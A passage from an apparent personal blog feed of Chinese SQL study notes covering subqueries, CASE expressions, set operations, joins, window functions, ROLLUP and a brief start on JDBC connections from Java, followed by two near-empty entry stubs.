和子查询</h4><p>IN(NOT IN)谓词，可以使用子查询作为其参数。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">select</span> product_name, <span class="hljs-function">sale_price</span><br><span class="hljs-function">  <span class="hljs-keyword">from</span> Product</span><br><span class="hljs-function"> <span class="hljs-keyword">where</span> product_id <span class="hljs-title">IN</span> (<span class="hljs-params"><span class="hljs-keyword">select</span> product_id </span></span><br><span class="hljs-params"><span class="hljs-function">                        <span class="hljs-keyword">from</span> ShopProduct</span></span><br><span class="hljs-params"><span class="hljs-function">                       <span class="hljs-keyword">where</span> shop_id = <span class="hljs-string">&#x27;000C&#x27;</span></span>)</span>;<br></code></pre></td></tr></table></figure><h4 id="NOT-IN-和子查询"><a href="#NOT-IN-和子查询" class="headerlink" title="NOT IN 和子查询"></a>NOT IN 和子查询</h4><p>语法和 IN 一致。</p><h3 id="EXIST-谓词"><a href="#EXIST-谓词" class="headerlink" title="EXIST 谓词"></a>EXIST 谓词</h3><h4 id="EXISTS谓词的使用方法"><a href="#EXISTS谓词的使用方法" class="headerlink" title="EXISTS谓词的使用方法"></a>EXISTS谓词的使用方法</h4><p>谓词的作用就是 “判断是否存在满足某种条件的记录”</p><h5 id="EXIST-的参数"><a href="#EXIST-的参数" class="headerlink" title="EXIST 的参数"></a>EXIST 的参数</h5><p>EXIST 左侧并没有参数.</p><p>EXIST 是只有1个参数的谓词，右侧参数通常为一个子查询。</p><h5 id="子查询中的-select"><a href="#子查询中的-select" class="headerlink" title="子查询中的 select *"></a>子查询中的 select *</h5><p>EXIST 只关心记录是否存在。</p><p>在 EXIST 的子查询中，常常书写 <code>select *</code>.</p><h5 id="NOT-EXIST"><a href="#NOT-EXIST" class="headerlink" title="NOT EXIST"></a>NOT EXIST</h5><p>与 EXIST 相反，当”不存在”满足子查询中指定条件的记录时返回真。</p><h2 id="6-3-CASE-表达式"><a href="#6-3-CASE-表达式" class="headerlink" title="6-3 CASE 表达式"></a>6-3 CASE 表达式</h2><h3 id="什么是-CASE-表达式"><a href="#什么是-CASE-表达式" class="headerlink" title="什么是 CASE 表达式"></a>什么是 CASE 表达式</h3><p>case 作为条件分支。</p><h3 id="CASE-表达式的语法"><a href="#CASE-表达式的语法" class="headerlink" title="CASE 表达式的语法"></a>CASE 表达式的语法</h3><p>CASE 表达式的语法分为:</p><ul><li>简单 case 表达式</li><li>搜索 case 表达式<br>搜索表达式包含了简单 case 表达式的全部功能。<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml">case when <span class="hljs-tag">&lt;<span class="hljs-name">求值表达式</span>&gt;</span> then <span class="hljs-tag">&lt;<span class="hljs-name">表达式</span>&gt;</span><br>     when <span class="hljs-tag">&lt;<span class="hljs-name">求值表达式</span>&gt;</span> then <span class="hljs-tag">&lt;<span class="hljs-name">表达式</span>&gt;</span><br>     when <span class="hljs-tag">&lt;<span class="hljs-name">求值表达式</span>&gt;</span> then <span class="hljs-tag">&lt;<span class="hljs-name">表达式</span>&gt;</span><br>                .<br>                . <br>                . <br>     else <span class="hljs-tag">&lt;<span class="hljs-name">表达式</span>&gt;</span><br>end<br></code></pre></td></tr></table></figure><code>when</code> 子句中的”&lt;求值表达式&gt;”就是类似”列 &#x3D; 值”</li></ul><p>直到返回为真为止.</p><h3 id="CASE-表达式的使用方法"><a href="#CASE-表达式的使用方法" class="headerlink" title="CASE 表达式的使用方法"></a>CASE 表达式的使用方法</h3><p><code>else</code>子句省略不写时会默认为<code>else null</code>.</p><h4 id="CASE-表达式的书写位置"><a href="#CASE-表达式的书写位置" class="headerlink" title="CASE 表达式的书写位置"></a>CASE 表达式的书写位置</h4><p><code>CASE</code> 是一个表达式，可以写在任意位置。</p><h3 id="简单-CASE-表达式"><a href="#简单-CASE-表达式" class="headerlink" title="简单 CASE 表达式"></a>简单 CASE 表达式</h3><p>会受条件的约束.</p><p>语法:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml">case <span class="hljs-tag">&lt;<span class="hljs-name">表达式</span>&gt;</span><br>     when <span class="hljs-tag">&lt;<span class="hljs-name">表达式</span>&gt;</span> then <span class="hljs-tag">&lt;<span class="hljs-name">表达式</span>&gt;</span><br>     when <span class="hljs-tag">&lt;<span class="hljs-name">表达式</span>&gt;</span> then <span class="hljs-tag">&lt;<span class="hljs-name">表达式</span>&gt;</span><br>     when <span class="hljs-tag">&lt;<span class="hljs-name">表达式</span>&gt;</span> then <span class="hljs-tag">&lt;<span class="hljs-name">表达式</span>&gt;</span><br>                .<br>                . <br>                . <br>     else <span class="hljs-tag">&lt;<span class="hljs-name">表达式</span>&gt;</span><br>end<br></code></pre></td></tr></table></figure><p>和搜索 case 表达式的不同之处在于，求值表达式变成了 case 后的表达式和 when 后面的表达式.</p><h3 id="特定的-case-表达式"><a href="#特定的-case-表达式" class="headerlink" title="特定的 case 表达式"></a>特定的 case 表达式</h3><h1 id="第7章-集合运算"><a href="#第7章-集合运算" class="headerlink" title="第7章 集合运算"></a>第7章 集合运算</h1><h2 id="7-1-表的加减法"><a href="#7-1-表的加减法" class="headerlink" title="7-1 表的加减法"></a>7-1 表的加减法</h2><h3 id="什么是集合运算"><a href="#什么是集合运算" class="headerlink" title="什么是集合运算"></a>什么是集合运算</h3><p>集合在数据库中表示 <mark>记录的集合</mark>.</p><p>集合运算就是对满足同一规则的记录进行的加减等四则运算。</p><p>通过集合运算，可以得到两张表中记录的集合或者公共记录的集合。</p><p>用于集合运算的运算符称为 <mark>集合运算符</mark>.</p><h3 id="表的加法-–-UNION"><a href="#表的加法-–-UNION" class="headerlink" title="表的加法 – UNION"></a>表的加法 – UNION</h3><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> product_id, product_name<br>  <span class="hljs-keyword">from</span> Product<br><span class="hljs-keyword">UNION</span><br><span class="hljs-keyword">select</span> product_id, product_name<br>  <span class="hljs-keyword">from</span> Product2<br></code></pre></td></tr></table></figure><p>结果会包含两张表的全部内容。也就是并集.</p><p>集合运算符也会除去重复的记录。</p><h3 id="集合运算的注意事项"><a href="#集合运算的注意事项" class="headerlink" title="集合运算的注意事项"></a>集合运算的注意事项</h3><h4 id="1-作为运算对象的记录的列数必须相同"><a href="#1-作为运算对象的记录的列数必须相同" class="headerlink" title="1 作为运算对象的记录的列数必须相同"></a>1 作为运算对象的记录的列数必须相同</h4><p>也就是 select 后的列数。</p><h4 id="2-作为运算对象的记录中列的类型必须一致"><a href="#2-作为运算对象的记录中列的类型必须一致" class="headerlink" title="2 作为运算对象的记录中列的类型必须一致"></a>2 作为运算对象的记录中列的类型必须一致</h4><p>相同位置上的列必须是同一数据类型。</p><h4 id="3-可以使用任何-select-语句，但-order-by-子句只能在最后使用一次。"><a href="#3-可以使用任何-select-语句，但-order-by-子句只能在最后使用一次。" class="headerlink" title="3 可以使用任何 select 语句，但 order by 子句只能在最后使用一次。"></a>3 可以使用任何 select 语句，但 order by 子句只能在最后使用一次。</h4><h3 id="包含重复行的集合运算-–-ALL-选项"><a href="#包含重复行的集合运算-–-ALL-选项" class="headerlink" title="包含重复行的集合运算 – ALL 选项"></a>包含重复行的集合运算 – ALL 选项</h3><p>在 UNION 后 加 ALL 就会保留重复行.</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> product_id, product_name<br>  <span class="hljs-keyword">from</span> Product<br><span class="hljs-keyword">UNION</span> <span class="hljs-keyword">ALL</span><br><span class="hljs-keyword">select</span> product_id, product_name<br>  <span class="hljs-keyword">from</span> Product2;<br></code></pre></td></tr></table></figure><h3 id="选取表中公共部分-–-INTERSECT"><a href="#选取表中公共部分-–-INTERSECT" class="headerlink" title="选取表中公共部分 – INTERSECT"></a>选取表中公共部分 – INTERSECT</h3><p>选取两个记录集合中公共部分的交集(INTERSECT).</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> product_id, product_name<br>  <span class="hljs-keyword">from</span> Product<br><span class="hljs-keyword">INTERSECT</span><br><span class="hljs-keyword">select</span> product_id, product_name<br>  <span class="hljs-keyword">from</span> Product2<br><span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> product_id;<br></code></pre></td></tr></table></figure><p>保留重复项同样可以使用 <code>INTERSECT ALL</code>.</p><h3 id="记录的减法-–-EXCEPT"><a href="#记录的减法-–-EXCEPT" class="headerlink" title="记录的减法 – EXCEPT"></a>记录的减法 – EXCEPT</h3><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> product_id, product_name<br>  <span class="hljs-keyword">from</span> Product<br><span class="hljs-keyword">EXCEPT</span><br><span class="hljs-keyword">select</span> product_id, product_name<br>  <span class="hljs-keyword">from</span> Product2<br><span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> product_id;<br></code></pre></td></tr></table></figure><p>结果只包含Product表中记录除去Product2表中记录之后的剩余部分。</p><h2 id="7-2-联结-以列为单位对表进行联结"><a href="#7-2-联结-以列为单位对表进行联结" class="headerlink" title="7-2 联结(以列为单位对表进行联结)"></a>7-2 联结(以列为单位对表进行联结)</h2><h3 id="什么是联结"><a href="#什么是联结" class="headerlink" title="什么是联结"></a>什么是联结</h3><p>UNION 和 INTERSECT 等会导致记录行数的增减。</p><p>联结(join)运算就是将其他表中的列添加过来。</p><h3 id="内联结-–-INNER-JOIN"><a href="#内联结-–-INNER-JOIN" class="headerlink" title="内联结 – INNER JOIN"></a>内联结 – INNER JOIN</h3><h4 id="内联结要点1-–-from-子句"><a href="#内联结要点1-–-from-子句" class="headerlink" title="内联结要点1 – from 子句"></a>内联结要点1 – from 子句</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">from</span> ShopProduct <span class="hljs-keyword">AS</span> SP <span class="hljs-keyword">INNER</span> <span class="hljs-keyword">JOIN</span> Product <span class="hljs-keyword">AS</span> P<br></code></pre></td></tr></table></figure><h4 id="内联结要点2-–-on-子句"><a href="#内联结要点2-–-on-子句" class="headerlink" title="内联结要点2 – on 子句"></a>内联结要点2 – on 子句</h4><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">ON <span class="hljs-keyword">SP</span>.product_id <span class="hljs-operator">=</span> P.product_id<br></code></pre></td></tr></table></figure><p>起到 where 的作用.</p><p>ON 子句需书写到 from 和 where 之间。</p><h4 id="内联结要点3-–-select-子句"><a href="#内联结要点3-–-select-子句" class="headerlink" title="内联结要点3 – select 子句"></a>内联结要点3 – select 子句</h4><p>由于多表联结时容易发生混乱, 因此采用 “&lt;表的别名&gt;.&lt;列名&gt;” 的形式来指定列。</p><p>其实只有同时存在于两张表中的列必须使用这种形式。</p><h4 id="内联结和-where-子句结合使用"><a href="#内联结和-where-子句结合使用" class="headerlink" title="内联结和 where 子句结合使用"></a>内联结和 where 子句结合使用</h4><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">select <span class="hljs-built_in">SP</span>.<span class="hljs-keyword">shop_id, </span><span class="hljs-built_in">SP</span>.<span class="hljs-keyword">shop_name, </span><span class="hljs-built_in">SP</span>.product_id, P.product_name, P.sale_price<br>  from <span class="hljs-keyword">ShopProduct </span>AS <span class="hljs-built_in">SP</span> INNER <span class="hljs-keyword">JOIN </span>Product AS P<br>    ON <span class="hljs-built_in">SP</span>.product_id = P.product_id<br>  where <span class="hljs-built_in">SP</span>.<span class="hljs-keyword">shop_id </span>= <span class="hljs-string">&#x27;000A&#x27;</span>;<br></code></pre></td></tr></table></figure><p>使用联结运算将满足相同规则的表联结起来，WHERE、GROUP BY、HAVING、ORDER BY等工具都可以正常使用。</p><p>这张表只在 select 语句执行期间存在，select 语句执行之后就会消失。如果希望继续使用这张表，需将其创建为视图.</p><h3 id="外联结-–-OUTER-JOIN"><a href="#外联结-–-OUTER-JOIN" class="headerlink" title="外联结 – OUTER JOIN"></a>外联结 – OUTER JOIN</h3><p>实现”从两张表中取出”的就是联结功能。</p><p>外联结也是通过 ON 子句的联结键将两张表进行联结，并从两张表中同时选取相应的列。</p><h4 id="外联结要点1-–-选取出单张表中全部的信息"><a href="#外联结要点1-–-选取出单张表中全部的信息" class="headerlink" title="外联结要点1 – 选取出单张表中全部的信息"></a>外联结要点1 – 选取出单张表中全部的信息</h4><p>内联结只能选取同时存在于两张表中的数据。</p><p>对于外联结，只要数据存在于某一张表中，就能够读取出来。</p><p>外联结名称的又来也跟 null 有关，即”结果中包含原表中不存在的信息”.</p><h4 id="外联结要点2-–-每张表都是主表吗"><a href="#外联结要点2-–-每张表都是主表吗" class="headerlink" title="外联结要点2 – 每张表都是主表吗?"></a>外联结要点2 – 每张表都是主表吗?</h4><p>最终的结果中会包含主表的所有数据。</p><p>指定主表的关键词是 <code>left</code> 和 <code>right</code>.</p><h4 id="3张以上的表的联结"><a href="#3张以上的表的联结" class="headerlink" title="3张以上的表的联结"></a>3张以上的表的联结</h4><p>原则上联结表的数量并没有限制。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">from</span> ShopProduct <span class="hljs-keyword">as</span> SP <span class="hljs-keyword">INNER</span> <span class="hljs-keyword">JOIN</span> Product <span class="hljs-keyword">as</span> P<br>  <span class="hljs-keyword">ON</span> SP.product_id = P.product_id<br>      <span class="hljs-keyword">INNER</span> <span class="hljs-keyword">JOIN</span> InventoryProduct <span class="hljs-keyword">as</span> IP<br>          <span class="hljs-keyword">ON</span> SP.product_id = IP.product_id<br></code></pre></td></tr></table></figure><h3 id="交叉联结-–-CROSS-JOIN-笛卡尔积"><a href="#交叉联结-–-CROSS-JOIN-笛卡尔积" class="headerlink" title="交叉联结 – CROSS JOIN(笛卡尔积)"></a>交叉联结 – CROSS JOIN(笛卡尔积)</h3><p>交叉联结是所有联结的基础.</p><p>交叉联结时无法使用内联结和外联结中所有的 ON 子句，这是因为交叉联结是对两张表中的全部记录进行交叉组合。</p><p>结果中的记录数通常是两张表中行数的乘积。</p><h3 id="联结的特定语法和过时语法"><a href="#联结的特定语法和过时语法" class="headerlink" title="联结的特定语法和过时语法"></a>联结的特定语法和过时语法</h3><h3 id="关系除法"><a href="#关系除法" class="headerlink" title="关系除法"></a>关系除法</h3><p>集合运算中的除法通常称为<mark>关系除法</mark>.</p><h1 id="第8章-SQL高级处理"><a href="#第8章-SQL高级处理" class="headerlink" title="第8章 SQL高级处理"></a>第8章 SQL高级处理</h1><h2 id="8-1-窗口函数"><a href="#8-1-窗口函数" class="headerlink" title="8-1 窗口函数"></a>8-1 窗口函数</h2><h3 id="什么是窗口函数"><a href="#什么是窗口函数" class="headerlink" title="什么是窗口函数"></a>什么是窗口函数</h3><p>窗口函数也称为OLAP函数(Online Analytical Processing).</p><h3 id="窗口函数的语法"><a href="#窗口函数的语法" class="headerlink" title="窗口函数的语法"></a>窗口函数的语法</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">&lt;窗口函数&gt; <span class="hljs-keyword">OVER</span> ([<span class="hljs-keyword">PARTITION</span> <span class="hljs-keyword">BY</span> &lt;列清单&gt;]<br>                        <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> &lt;排序用列清单&gt;)<br></code></pre></td></tr></table></figure><p>其中，<code>[]</code>中的内容可以省略。</p><h4 id="能够作为窗口函数使用的函数"><a href="#能够作为窗口函数使用的函数" class="headerlink" title="能够作为窗口函数使用的函数"></a>能够作为窗口函数使用的函数</h4><p>窗口函数大体分为两种:</p><ul><li>能够作为窗口函数的聚合函数(SUM、AVG、COUNT、MAX、MIN)</li><li>RANK、DENSE_RANK、ROW_NUMBER等专用窗口函数</li></ul><h3 id="语法的基本使用方法-–-使用-RANK-函数"><a href="#语法的基本使用方法-–-使用-RANK-函数" class="headerlink" title="语法的基本使用方法 – 使用 RANK 函数"></a>语法的基本使用方法 – 使用 RANK 函数</h3><p><mark>PARTITION BY</mark> 设定排序的对象范围。用于在横向上对表进行分组。</p><p><mark>ORDER BY</mark> 指定按照哪一列、何种顺序进行排序. 与 select 语句末尾的 order by 一样，可以通过关键词 ASC&#x2F;DESC 来指定升序和降序。决定纵向排序的规则。</p><p>通过 PARTITION BY 分组后的记录的集合可以称为窗口。窗口的意思为范围。</p><p>窗口函数兼具分组和排序两种功能。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> product_name, product_type, sale_price,<br>       RANK() <span class="hljs-keyword">OVER</span> (<span class="hljs-keyword">PARTITION</span> <span class="hljs-keyword">BY</span> product_type<br>                         <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> sale_price) <span class="hljs-keyword">AS</span> ranking<br>  <span class="hljs-keyword">FROM</span> Product;<br></code></pre></td></tr></table></figure><h3 id="无需指定-PARTITION-BY"><a href="#无需指定-PARTITION-BY" class="headerlink" title="无需指定 PARTITION BY"></a>无需指定 PARTITION BY</h3><p>不指定时将整个表作为一个大的窗口使用.</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">SELECT</span> product_name, product_type, sale_price,<br>       RANK() <span class="hljs-keyword">OVER</span> (<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> sale_price) <span class="hljs-keyword">AS</span> ranking <span class="hljs-keyword">FROM</span> Product;<br></code></pre></td></tr></table></figure><p>将表中数据分为多个部分时使用 PARTITION BY.</p><h3 id="专用窗口函数的种类"><a href="#专用窗口函数的种类" class="headerlink" title="专用窗口函数的种类"></a>专用窗口函数的种类</h3><p>代表性的专用窗口函数:</p><ul><li>RANK函数, 计算排序时，如果存在相同位次的记录，则会跳过之后的位次。如: 1位, 1位, 1位, 4位</li><li>DENDE_RANK, 不会跳过位次.如:1位, 1位, 1位, 2位</li><li>ROW_NUMBER函数，赋予唯一的连续位次. 如: 1位, 2位, 3位</li></ul><p>专用窗口函数无需参数，因此通常括号中都是空的。</p><h3 id="窗口函数的适用范围"><a href="#窗口函数的适用范围" class="headerlink" title="窗口函数的适用范围"></a>窗口函数的适用范围</h3><p>原则上窗口函数只能在 select 子句中使用。</p><p>在 select 子句之外”使用窗口函数是没有意义的”.</p><h3 id="作为窗口函数使用的聚合函数"><a href="#作为窗口函数使用的聚合函数" class="headerlink" title="作为窗口函数使用的聚合函数"></a>作为窗口函数使用的聚合函数</h3><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span> product_id, product_name, sale_price, <br>      <span class="hljs-built_in">SUM</span> (sale_price) <span class="hljs-keyword">OVER</span> (<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> product_id) <span class="hljs-keyword">AS</span> current_sum <span class="hljs-keyword">FROM</span> Product;<br></code></pre></td></tr></table></figure><p>形成 <mark>累计</mark> 的统计方法。</p><p>以”自身记录(当前记录)”作为基准进行统计，就是将聚合函数作为窗口函数使用的最大特征。</p><h3 id="计算移动平均"><a href="#计算移动平均" class="headerlink" title="计算移动平均"></a>计算移动平均</h3><p>在窗口中指定更加详细的汇总范围的备选功能，即<mark>框架</mark>.</p><p>也就是可以指定那几行进行汇总。</p><h4 id="指定框架"><a href="#指定框架" class="headerlink" title="指定框架"></a>指定框架</h4><p>使用 ROW 和 PRECEDING 两个关键词，将框架指定为 “截止到之前~行”.</p><p>如”ROW 2 PRECEDING”:</p><ul><li>自身(当前记录)</li><li>之前1行的记录</li><li>之前2行的记录<br>这样的统计方法称为<mark>移动平均</mark>(moving average).</li></ul><p>关键词FOLLOWING指”截止到之后~行”.</p><p>主要是要找到当前行。</p><h4 id="将当前记录的前后行作为汇总对象"><a href="#将当前记录的前后行作为汇总对象" class="headerlink" title="将当前记录的前后行作为汇总对象"></a>将当前记录的前后行作为汇总对象</h4><p>同时使用 PRECEDING 和 FOLLOWING.</p><h3 id="两个-ORDER-BY"><a href="#两个-ORDER-BY" class="headerlink" title="两个 ORDER BY"></a>两个 ORDER BY</h3><p>使用窗口函数时必须要在 OVER 子句中使用 ORDER BY. 但其只是用来决定窗口函数按照什么样的顺序进行计算。</p><p>在 select 语句的最后使用 order by 子句保证排序记录。</p><h2 id="8-2-GROUPING-运算符"><a href="#8-2-GROUPING-运算符" class="headerlink" title="8-2 GROUPING 运算符"></a>8-2 GROUPING 运算符</h2><h3 id="同时得到合计行"><a href="#同时得到合计行" class="headerlink" title="同时得到合计行"></a>同时得到合计行</h3><h3 id="ROLLUP-–-同时得出合计和小计"><a href="#ROLLUP-–-同时得出合计和小计" class="headerlink" title="ROLLUP – 同时得出合计和小计"></a>ROLLUP – 同时得出合计和小计</h3><p>GROUPING 运算符包含以下3种:</p><ul><li>ROLLUP</li><li>CUBE</li><li>GROUPING SETS</li></ul><h4 id="ROLLUP-的使用方法"><a href="#ROLLUP-的使用方法" class="headerlink" title="ROLLUP 的使用方法"></a>ROLLUP 的使用方法</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">SELECT</span> product_type, SUM(sale_price) <span class="hljs-keyword">AS</span> sum_price<br>    <span class="hljs-keyword">FROM</span> Product<br>  <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> <span class="hljs-keyword">ROLLUP</span>(product_type);<br></code></pre></td></tr></table></figure><p>GROUP BY() 被称为<mark>超级分组记录(super group row)</mark>.</p><p>超级分组记录默认使用 NULL 作为聚合键。</p><h4 id="将”登记日期”添加到聚合键中"><a href="#将”登记日期”添加到聚合键中" class="headerlink" title="将”登记日期”添加到聚合键中"></a>将”登记日期”添加到聚合键中</h4><h3 id="GROUPING函数-–-让NULL更加容易分辨"><a href="#GROUPING函数-–-让NULL更加容易分辨" class="headerlink" title="GROUPING函数 – 让NULL更加容易分辨"></a>GROUPING函数 – 让NULL更加容易分辨</h3><p><code>GROUPING</code>函数 – 用来判断超级分组记录的 NULL 的特定函数。</p><p>在其参数列的值为超级分组记录所产生的 NULL 时返回1，其他情况返回0.</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">SELECT</span> GROUOING(product_type) <span class="hljs-keyword">AS</span> product_type<br>        GROUPING(regist_date) <span class="hljs-keyword">AS</span> regist_date, SUM(sale_price) <span class="hljs-keyword">AS</span> sum_price<br>        <span class="hljs-keyword">FROM</span> Product<br>      <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> <span class="hljs-keyword">ROLLUP</span>(product_type, regist_date);<br></code></pre></td></tr></table></figure><h3 id="CUBE-–-用数据来搭积木"><a href="#CUBE-–-用数据来搭积木" class="headerlink" title="CUBE – 用数据来搭积木"></a>CUBE – 用数据来搭积木</h3><h1 id="第9章-通过应用程序连接数据库"><a href="#第9章-通过应用程序连接数据库" class="headerlink" title="第9章 通过应用程序连接数据库"></a>第9章 通过应用程序连接数据库</h1><h2 id="9-1-数据库世界和应用程序世界的连接"><a href="#9-1-数据库世界和应用程序世界的连接" class="headerlink" title="9-1 数据库世界和应用程序世界的连接"></a>9-1 数据库世界和应用程序世界的连接</h2><h3 id="数据库和应用程序之间的关系"><a href="#数据库和应用程序之间的关系" class="headerlink" title="数据库和应用程序之间的关系"></a>数据库和应用程序之间的关系</h3><p>系统 &#x3D; 应用 + 数据库</p><h3 id="驱动-–-两个世界之间的桥梁"><a href="#驱动-–-两个世界之间的桥梁" class="headerlink" title="驱动 – 两个世界之间的桥梁"></a>驱动 – 两个世界之间的桥梁</h3><p>驱动，实际上就是连接的意思。</p><p>驱动，用于解决更换编程语言或者DBMS而导致从头开始修改应用和SQL语句。</p><p>驱动是用来连接应用和数据库的非常小的特殊程序。</p><h3 id="驱动的种类"><a href="#驱动的种类" class="headerlink" title="驱动的种类"></a>驱动的种类</h3><p>DBMS 和编程语言的不同，使用的驱动程序也不一样。</p><p>现在广泛使用的驱动标准主要有 ODBC(Open DataBase Connectivity) 和 JDBC(Java Data Base Connectivity).</p><p><a href="https://jdbc.postgresql.org/download.html">下载 Driver 的网站</a></p><p><code>.jar</code> 扩展名是 Java 的可执行文件的扩展名。</p><h2 id="9-2-Java-基础知识"><a href="#9-2-Java-基础知识" class="headerlink" title="9-2  Java 基础知识"></a>9-2  Java 基础知识</h2><p><code>src</code> 是 <code>源代码</code>(source) 的简称。</p><p>SQL 中的字符串是使用单引号(‘)括起来的。</p><h3 id="编译和程序执行"><a href="#编译和程序执行" class="headerlink" title="编译和程序执行"></a>编译和程序执行</h3><p>使用 javac 进行编译:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">javac</span> <span class="hljs-regexp">*.java</span><br></code></pre></td></tr></table></figure><p>编译成功后会生成<code>.class</code>文件，其为可执行文件，称为”类文件”.</p><h4 id="使用-java-命令执行程序"><a href="#使用-java-命令执行程序" class="headerlink" title="使用 java 命令执行程序"></a>使用 java 命令执行程序</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">java <span class="hljs-tag">&lt;<span class="hljs-name">类名</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="常见错误"><a href="#常见错误" class="headerlink" title="常见错误"></a>常见错误</h3><h4 id="大小写错误"><a href="#大小写错误" class="headerlink" title="大小写错误"></a>大小写错误</h4><p>Java 区分大小写。</p><h4 id="使用全角空格"><a href="#使用全角空格" class="headerlink" title="使用全角空格"></a>使用全角空格</h4><p>源代码中不能使用全角空格。</p><h4 id="源文件的文件名和类名不一致"><a href="#源文件的文件名和类名不一致" class="headerlink" title="源文件的文件名和类名不一致"></a>源文件的文件名和类名不一致</h4><p>文件名必须和源代码第1行的类名一致。</p><h4 id="命令名和文件名错误"><a href="#命令名和文件名错误" class="headerlink" title="命令名和文件名错误"></a>命令名和文件名错误</h4><h2 id="9-3-通过-Java-联结-PostgreSQL"><a href="#9-3-通过-Java-联结-PostgreSQL" class="headerlink" title="9-3 通过 Java 联结 PostgreSQL"></a>9-3 通过 Java 联结 PostgreSQL</h2><h3 id="执行-SQL-语句的-Java-程序"><a href="#执行-SQL-语句的-Java-程序" class="headerlink" title="执行 SQL 语句的 Java 程序"></a>执行 SQL 语句的 Java 程序</h3><h3 id="Java-是如何从数据库中获取数据的"><a href="#Java-是如何从数据库中获取数据的" class="headerlink" title="Java 是如何从数据库中获取数据的"></a>Java 是如何从数据库中获取数据的</h3>]]></content>
    
    
    <categories>
      
      <category>SQL</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>图灵机</title>
    <link href="/2022/08/07/%E5%9B%BE%E7%81%B5%E6%9C%BA/"/>
    <url>/2022/08/07/%E5%9B%BE%E7%81%B5%E6%9C%BA/</url>
    
    <content type="html"><![CDATA[<p><a href="https://baike.baidu.com/item/%E5%9B%BE%E7%81%B5%E6%9C%BA/2112989?fr=aladdin">reference</a></p>]]></content>
    
    
    <categories>
      
      <category>Skills</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>宏 学习 Notes</title>
    <link href="/2022/08/07/%E5%AE%8F-%E5%AD%A6%E4%B9%A0-Notes/"/>
    <url>/2022/08/07/%E5%AE%8F-%E5%AD%A6%E4%B9%A0-Notes/</url>
    
